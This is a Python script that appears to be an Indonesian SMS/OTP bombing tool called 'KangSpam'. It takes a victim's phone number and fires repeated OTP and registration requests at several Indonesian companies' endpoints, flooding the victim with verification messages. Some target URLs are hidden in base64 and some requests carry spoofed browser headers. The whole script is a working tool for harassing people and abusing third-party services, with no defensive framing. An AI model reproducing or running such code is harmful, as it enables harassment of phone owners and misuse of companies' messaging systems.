import requests as rek
import marshal
import base64
import json
import time
import os

biasa  = '\x1b[0m'
tebel  = '\x1b[1m'
poek   = '\x1b[90m'
berem  = '\x1b[31m'
hejo   = '\x1b[32m'
koneng = '\x1b[33m'
biru   = '\x1b[34m'
ungu   = '\x1b[35m'
aqua   = '\x1b[36m'
bodas  = '\x1b[37m'
BEREM  = '\x1b[91m'
HEJO   = '\x1b[92m'
KONENG = '\x1b[93m'
BIRU   = '\x1b[94m'
UNGU   = '\x1b[95m'
AQUA   = '\x1b[96m'
BODAS  = '\x1b[97m'

aku = { 'Instagram':'https://instagram.com/n74nk420',
		'Facebook':'https://facebook.com/njnk.xnxx',
		'Website':'https://yutixcode.xyz',
		'Github':'https://github.com/Yutixcode',
		'Email':'yutixcode@gmail.com' }

class Yx:
	def naon():
		try:
			Y = input(f'  {AQUA}-  {biasa}nomor: {AQUA}')
			X = input(f'  {AQUA}-  {biasa}total: {AQUA}')
			if int(X) < 26:
				C = {'z':Y, 'x':X}
				return C
			else:
				lol = 'Count terlalu besar, Max: 25'
				to(lol)
		except KeyboardInterrupt:
			lol = 'Program diberhentikan'
			to(lol)

	def magnetpro(nomer, kabehna):
		bac = yxtr('aHR0cHM6Ly93d3cubWFnbmV0cHJvLmNvLmlkL2tpcmltb3RwLnBocA==')['yxhost']
		cot = { "dhp": nomer }
		try:
			print()
			for i in range(int(kabehna)):
				ku = rek.post(bac, data=cot)
				ma = json.loads(ku.text)
				ha = ma['data_sz']
				if ha == 1:
					Sip.true(i)
				else:
					Sip.error(i)
			sip()
		except KeyboardInterrupt:
			lol = 'Program diberhentikan'
			to(lol)
		except Exception as lol:
			to(lol)

	def thaibah(nomer, kabehna):
		url = 'https://thaibah.com:443/home/resendOtp'
		num = base64.b64encode(bytes(nomer, 'utf-8'))
		dat = {"nohp":num,
				"reff":"MTI4NDg5MDcxNw==",
				"type":"cmVnaXN0ZXI=",
				"provider":"c21z"}
		try:
			print()
			for i in range(int(kabehna)):
				x = json.loads(rek.post(url, data=dat).text)["status"]
				if x == 'success':
					Sip.true(i)
				else:
					Sip.error(i)
			sip()
		except KeyboardInterrupt:
			lol = 'Program diberhentikan'
			to(lol)
		except Exception as lol:
			to(lol)

	def lokadok(nomer, kabehna):
		head = yxtr('aHR0cHM6Ly93d3cubG9rYWRvay5jby5pZDo0NDMvYWpheF9oYW5kbGVyL2dlbmVyYXRlX3ZlcmlmaWNhdGlvbl9jb2RlLw==')['yxhost']
		haed = {'type':'REG', 
				'mobile_number':nomer}
		hade = {'Host':'www.lokadok.co.id',
				'Connection':'keep-alive',
				'Content-Length':'34',
				'Accept':'application/json, text/javascript, */*; q=0.01',
				'Origin':'https://www.lokadok.co.id',
				'X-Requested-With':'XMLHttpRequest',
				'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
				'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
				'Referer':'https://www.lokadok.co.id/user/register',
				'Accept-Encoding':'gzip, deflate',
				'Accept-Language':'id-ID,en-US;q=0.8'}
		try:
			print()
			for i in range(int(kabehna)):
				rek.post(head, data=haed, headers=hade)
				Sip.true(i)
			sip()
		except KeyboardInterrupt:
			lol = 'Program diberhentikan'
			to(lol)
		except Exception as lol:
			to(lol)

	def kreditplus(nomer, kabehna):
		hujan = 'http://kreditmu.com/registration/getOtpResponse/'
		try:
			print()
			for i in range(int(kabehna)):
				halah = rek.get(hujan+nomer)
				masia = json.loads(halah.text)
				gabut = masia['Status']
				if gabut == '0':
					Sip.true(i)
				else:
					Sip.error(i)
			sip()
		except KeyboardInterrupt:
			lol = 'Program diberhentikan'
			to(lol)
		except Exception as lol:
			to(lol)

	def lapor(dari, mail, pesan):
		host = "https://aapbd.com/YXC/Vcskuy.php"
		data = {"fromname": dari.title(),
				"fromemail": mail,
				"replytoname": dari.title(),
				"replytoemail": mail,
				"to": "yutixcode@gmail.com",
				"subject": "Hi, I'm KangSpam user",
				"message": pesan }
		try:
			rek.post(host, data=data)
			lol = f'{HEJO}Laporan sukses terkirim'
			to(lol)
		except Exception as lol:
			to(lol)

class Sip:
	def true(i):
		print(f'  {biasa}>  {AQUA}[{i+1:0=2d}] {biasa}Status: {HEJO}Success')
		time.sleep(1)
	def error(i):
		print(f'  {biasa}>  {AQUA}[{i+1:0=2d}] {biasa}Status: {BEREM}Failed')

def yxtr(object):
	baitsx = object.encode('ascii')
	baitsz = base64.b64decode(baitsx)
	baitsZ = baitsz.decode('ascii')
	msg    = { 'yxhost': baitsZ }
	return msg

def sip():
	exit(f'\n {UNGU}[#] {biasa}Program selesai\n')

def to(lol):
	exit(f'\n {biasa}[!] {berem}{lol}{biasa}\n')